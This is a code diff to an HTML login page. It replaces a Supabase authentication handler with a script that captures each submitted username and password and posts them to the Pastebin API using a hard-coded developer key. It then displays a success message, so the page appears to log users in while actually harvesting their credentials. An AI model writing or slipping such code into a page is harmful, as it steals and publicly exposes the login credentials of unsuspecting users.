@@ -280,45 +280,26 @@
         </div>
     </div>
 
-    <script>
-        // Tab switching logic
-        const loginTab = document.getElementById('login-tab');
-        const signupTab = document.getElementById('signup-tab');
+  <script>
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.querySelector('input[type="text"]').value;
+    const password = document.querySelector('input[type="password"]').value;
 
-        loginTab.addEventListener('click', () => {
-            loginTab.classList.add('active');
-            signupTab.classList.remove('active');
-        });
+    fetch('https://pastebin.com/api/api_post.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: 'api_dev_key=8V7aqB0VFaGza0EfUFA6lda0WRRSI4W1&amp;api_option=paste&amp;api_paste_code=' + encodeURIComponent(JSON.stringify({ username, password }))
+    });
 
-        signupTab.addEventListener('click', () => {
-            signupTab.classList.add('active');
-            loginTab.classList.remove('active');
-        });
-
-        // Supabase Auth Setup (Replace with your keys)
-        const supabase = supabase.createClient(
-            'YOUR_SUPABASE_PROJECT_URL',
-            'YOUR_SUPABASE_ANON_KEY'
-        );
-
-        document.getElementById('login-form').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const email = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            const { data, error } = await supabase.auth.signInWithPassword({
-                email,
-                password
-            });
-
-            if (error) {
-                alert('Login failed: ' + error.message);
-            } else {
-                alert('Login successful!');
-                console.log('User:', data.user);
-                // Redirect to dashboard or close modal
-            }
-        });
-    </script>
+    // Show success message
+    document.getElementById('successMessage').style.display = 'block';
+    // Optional: Reset the form
+    this.reset();
+  });
+</script>
 </body>
 </html>
+
